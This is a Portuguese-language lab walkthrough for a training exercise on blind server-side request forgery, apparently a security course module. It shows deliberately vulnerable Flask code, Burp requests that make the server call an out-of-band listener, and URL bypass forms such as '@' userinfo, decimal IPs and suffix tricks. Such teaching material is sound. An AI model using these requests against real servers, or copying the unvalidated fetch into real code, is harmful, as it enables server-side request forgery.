# Walkthrough — ssrf-blind-oob

Você vai fazer o servidor alcançar um host da sua escolha e **provar** que ele fez isso — sem nunca ler um único byte do que ele buscou. No `ssrf-basic` o servidor te entregava a resposta e você lia um serviço interno direto. Aqui o servidor não te diz nada: toda requisição recebe o mesmo `Test ping sent.` de volta. Isso não é o SSRF estar ausente; é o SSRF estar **blind**. Você vai confirmá-lo out-of-band, observando um callback pousar num listener que você controla.

Há um ator neste átomo: você, o pentester, sondando o endpoint. A trilha principal é o Burp Repeater (pra disparar a requisição) mais o `docker compose logs` (pra capturar o callback); o browser é a trilha secundária de baixa fricção.

## 1. Contexto

A app é um "webhook tester". No `/` há um form com um campo de URL; submetê-lo envia `POST /ping`, e o servidor dispara um `GET` em background naquela URL como efeito colateral — do jeito que uma app "envia um evento de teste pro seu webhook". A resposta é sempre a mesma:

```
Test ping sent.
```

Sem corpo buscado, sem status, sem erro — nada sobre o que o servidor de fato alcançou. É esse o ponto inteiro: essa feature é **blind**.

## 2. Sobre o ambiente deste lab

Três containers sobem juntos (ver [`docker-compose.yml`](./docker-compose.yml)):

- `vulnerable` (publicado em `127.0.0.1:8016`) e `fixed` (`127.0.0.1:8116`) — o webhook tester, quebrado e corrigido.
- `oob-listener` — um **sink out-of-band** burro. Ele loga toda requisição que recebe e retorna `ok`. É uma **tripwire, não um alvo**: não guarda segredo nenhum. **Não** é publicado no host — sem entrada `ports:` — então `curl http://oob-listener/` do seu laptop não o alcança. Só é alcançável de dentro das redes Docker, no hostname `oob-listener` na porta 80.

`vulnerable` e `fixed` ficam em redes Docker **separadas**; ambos compartilham uma rede com o `oob-listener`. Então cada app alcança o listener, mas as apps não se enxergam. Você observa o listener pelos logs dele:

```bash
docker compose logs oob-listener
```

O listener registra o IP de origem de cada hit (`from=...`), o que te deixa distinguir um callback do `vulnerable` de um do `fixed`.

**Por que o listener está aqui?** Num engagement real você usaria um serviço de interação externo — Burp Collaborator, `interactsh`, um catcher seu na internet. Este lab é auto-contido e bindado em `127.0.0.1`, então não pode depender de alcançar um terceiro. O `oob-listener` é um substituto self-hosted e air-gapped desse sink externo. Tudo que você faz contra ele, você faria contra o Collaborator no campo.

## 3. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/ping` é curta:

```python
@app.route("/ping", methods=["POST"])
def ping():
    url = request.form.get("url", "")
    # VULNERABLE: fire a server-side request to an attacker-controlled URL and reveal nothing ...
    try:
        requests.get(url, timeout=5)  # server-side request to the attacker-chosen destination
    except Exception:
        pass  # swallow everything: surfacing the error would leak an in-band oracle
    return "Test ping sent."  # generic: says nothing about whether or what was fetched
```

O valor `url` do form flui direto pra `requests.get(url, ...)`. Sem parsing, sem allowlist, sem checagem de host — qualquer URL que você mande, o servidor busca. Duas perguntas de auditoria:

- *O servidor faz uma requisição pra um destino que EU escolho?* — **sim**. Esse é o SSRF.
- *Eu consigo ler o resultado?* — **não**. A resposta é uma string fixa; a exceção é engolida. É isso que o torna **blind**.

As duas respostas importam, e são independentes. A primeira é a vulnerabilidade; a segunda é só o quão difícil é confirmar.

## 4. Exploração via Burp Suite + logs (trilha principal)

Aponte seu browser pro Burp, visite <http://127.0.0.1:8016/>, submeta o form uma vez pra capturar o tráfego, então clique com o botão direito na requisição `POST /ping` em **Proxy → HTTP history** e **Send to Repeater**.

### Uma nota sobre encoding

O corpo do form é `application/x-www-form-urlencoded`, então `&`, `=`, `+` e espaços dentro do valor precisam ser percent-encoded (um espaço literal quebra a requisição; `&` iniciaria um novo campo). As URLs deste lab não têm nenhum desses — `http://oob-listener/proof-ssrf-16` viaja bem como está. Se quiser uma opção sem pensar, selecione o valor no Repeater e aperte **Ctrl+U** pra URL-encodá-lo.

### Passo 1 — Baseline: conheça a cegueira

Mande o valor default primeiro. Corpo:

```
url=https://hooks.example.com/webhook-test
```

Resposta: `200 OK`, corpo `Test ping sent.` O host do webhook não resolve dentro do lab, então o fetch falhou — mas você não tem como saber. A resposta que você teria se ele tivesse *funcionado* é idêntica. **Fica com isso: a resposta não consegue distinguir sucesso de falha. Isso é blind SSRF, e é a razão de o resto deste walkthrough viver nos logs, não na resposta.**

### Passo 2 — Dispare o payload

Agora aponte o servidor pro listener. Corpo:

```
url=http://oob-listener/proof-ssrf-16
```

Requisição no Repeater:

```
POST /ping HTTP/1.1
Host: 127.0.0.1:8016
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

url=http://oob-listener/proof-ssrf-16
```

Resposta:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 15
Connection: close

Test ping sent.
```

A resposta é, de novo, `Test ping sent.` — byte a byte igual ao baseline. O Burp não te mostra **nada** sobre se o servidor alcançou o listener. Se você parasse aqui, não poderia afirmar que o SSRF disparou. Então não pare aqui.

O path `/proof-ssrf-16` é um marker fixo e reconhecível: você o escolheu, então quando ele aparecer no log do listener você sabe que *esta* requisição o colocou lá.

### Passo 3 — Confirme out-of-band (a prova)

Leia o log do listener:

```bash
docker compose logs oob-listener
```

```
oob-listener-1  | INFO:app:OOB HIT path=/proof-ssrf-16 from=192.168.32.2
oob-listener-1  | INFO:werkzeug:192.168.32.2 - - [22/Jul/2026 18:40:24] "GET /proof-ssrf-16 HTTP/1.1" 200 -
```

Lá está. O servidor fez a requisição que você pediu — pra um host que seu laptop nem consegue alcançar — e o callback pousou no seu listener. `from=192.168.32.2` é o endereço do container `vulnerable` na rede compartilhada (o seu vai diferir; cheque com `docker inspect`), então você sabe que a app vulnerable fez esse hit, não outra coisa. **Esta é a confirmação que o corpo da resposta não pôde te dar.** O baseline do Passo 1 não produziu linha nenhuma dessas — ele nunca alcançou o listener — então o único hit `/proof-ssrf-16` é inequivocamente seu.

É essa a skill inteira de blind SSRF: provar que a requisição aconteceu quando você não pode ver o resultado dela.

## 5. O que a vuln NÃO é

Como o exploit não produz loot visível, é fácil tirar a lição errada. Crave o que isto *não* é:

- **NÃO é "sem output, então sem SSRF".** A resposta não revelou nada, e o SSRF é real — o log prova. Cegueira não é ausência. É esse o mal-entendido que o átomo existe pra matar.
- **NÃO é "a resposta genérica é uma defesa".** A resposta é genérica *de propósito* (é blind), e o servidor mesmo assim fez a requisição. Esconder o output não impede o SSRF; só remove a sua confirmação in-band.
- **NÃO é SSRF in-band.** No `ssrf-basic` você *lê* o recurso buscado na resposta; aqui você *detecta* o callback out-of-band. Mesma primitiva de requisição server-side, canal de leitura diferente (ausente).
- **O que É:** o servidor emite uma requisição pra um destino que **você escolhe** (`http://oob-listener/...`), e você prova isso out-of-band. A única correção que endereça isso é validar o destino — não esconder a resposta, que já está escondida.

## 6. Impacto

Blind SSRF significa que o servidor pode ser coagido a fazer requisições outbound arbitrárias pra destinos que o atacante escolhe, sem o atacante ver a resposta. Por si só, é isso que este átomo demonstra: **detecção da primitiva** — a prova de que o servidor sai pra fora sob o seu comando.

O listener aqui é uma tripwire, não um prêmio; não tem nada pra roubar. Este átomo para na primitiva — o callback confirmado, a prova de que o servidor fez uma requisição que você escolheu. Esse é o teto honesto: não é RCE, e nada aqui deve ser superestimado além de "fiz o servidor alcançar um destino que eu escolhi, e provei out-of-band".

## 7. Exploração via browser (trilha secundária, opcional)

A primeira passada mais suave, sem precisar de Burp:

1. Abra <http://127.0.0.1:8016/>.
2. Deixe o campo como `http://oob-listener/proof-ssrf-16` (ou digite) e clique em **Send test ping**.
3. A página diz `Test ping sent.` — e não te conta mais nada.
4. Num terminal: `docker compose logs oob-listener` → a linha `OOB HIT path=/proof-ssrf-16`.

Migre pro Burp pro trabalho de verdade: o Repeater deixa trivial iterar em payloads e controlar a requisição crua, que é o que você faria num engagement.

**Uma nota sobre DNS.** Este lab usa um callback HTTP porque é simples e auto-contido. No campo, o sinal out-of-band é frequentemente um pingback de **DNS** em vez de HTTP: o egress filtering pode impedir o servidor de abrir uma conexão HTTP de saída, mas ele quase sempre ainda consegue *resolver um nome*, e essa resolução alcança o seu serviço de interação. Mesma ideia — uma requisição escapando pra um sink que você controla — por um canal com mais chance de sobreviver ao filtro. Burp Collaborator e `interactsh` capturam os dois.

## 8. Por que o fix funciona

Ver [`DIFF.md`](./DIFF.md) pra a mudança. A view `/ping` corrigida valida o destino contra uma allowlist deny-by-default *antes* de buscar, checada no host parseado:

```python
parsed = urlparse(url)
if parsed.scheme == "https" and parsed.hostname in ALLOWED_HOSTS:
    try:
        requests.get(url, timeout=5)
    except Exception:
        pass
return "Test ping sent."
```

Replaye o Passo 2 contra <http://127.0.0.1:8116/ping>:

```
POST /ping HTTP/1.1
Host: 127.0.0.1:8116
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

url=http://oob-listener/proof-ssrf-16
```

Resposta: `200 OK`, corpo `Test ping sent.` — **byte-idêntica à resposta da app vulnerable.** Agora leia o log:

```bash
docker compose logs oob-listener
```

**Não** há hit novo do container fixed (nenhuma linha `from=<fixed-ip>`). O destino `http://oob-listener/...` não está na allowlist (e não é `https`), então a requisição nunca foi enviada. A resposta é a mesma nas duas apps; a única diferença observável é o callback que não acontece. Em blind SSRF, é exatamente assim que você confirma o fix — do mesmo jeito que confirmou o bug: out-of-band.

Duas coisas que vale checar, porque são o ponto do fix:

- **É uma allowlist, não um blocklist.** Um blocklist de faixas de IP privado impediria você de alcançar um alvo interno — mas *não* impediria um callback out-of-band pra um host externo, então não impediria a detecção. Uma allowlist rejeita tudo que não é vetado, interno ou externo. (Neste lab air-gapped o sink por acaso é interno, então um blocklist o barraria incidentalmente também — mas isso é um artefato do lab, não uma propriedade em que você possa confiar no campo. Ver [`DIFF.md`](./DIFF.md).)
- **Ele decide sobre o host parseado, não sobre um substring.** `https://hooks.example.com@oob-listener/` parece conter o host permitido, mas `urlparse(...).hostname` é `oob-listener` — a parte depois do `@` — então é rejeitado. Formas de IP decimal (`http://2130706433/`), truques de sufixo (`http://hooks.example.com.evil.test/`) e portas explícitas (`http://oob-listener:80/`) falham todos do mesmo jeito: o host que o cliente HTTP de fato conectaria não está na lista.

O controle vive na aplicação, não na rede — o `fixed` ainda alcança o `oob-listener` na camada de rede; ele simplesmente se recusa.
